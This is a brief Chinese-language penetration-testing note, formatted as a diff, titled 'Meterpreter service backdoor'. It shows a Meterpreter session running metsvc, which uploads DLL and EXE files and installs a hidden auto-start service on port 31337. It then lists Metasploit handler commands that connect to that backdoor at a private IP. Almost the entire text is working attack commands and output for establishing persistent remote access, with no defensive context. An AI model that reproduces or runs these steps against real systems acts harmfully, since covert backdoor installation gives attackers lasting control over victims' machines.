@@ -1,0 +1,24 @@
+Meterpreter服务后门
+
+meterpreter > run metsvc
+[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
+[!] Example: run exploit/windows/local/persistence OPTION=value [...]
+[*] Creating a meterpreter service on port 31337
+[*] Creating a temporary installation directory C:\Users\AAA\AppData\Local\Temp\HtEVzWzgtb...
+[*]  >> Uploading metsrv.x86.dll...
+[*]  >> Uploading metsvc-server.exe...
+[*]  >> Uploading metsvc.exe...
+[*] Starting the service...
+         * Installing service metsvc
+ * Starting service
+Service metsvc successfully installed.
+
+之后电脑就默默生成了一个自启服务Meterpreter
+
+然后连接后门
+
+msf exploit(handler) > use exploit/multi/handler
+msf exploit(handler) > set payload windows/metsvc_bind_tcp
+msf exploit(handler) > set RHOST 192.168.32.234
+msf exploit(handler) > set LPORT 31337
+msf exploit(handler) > exploit
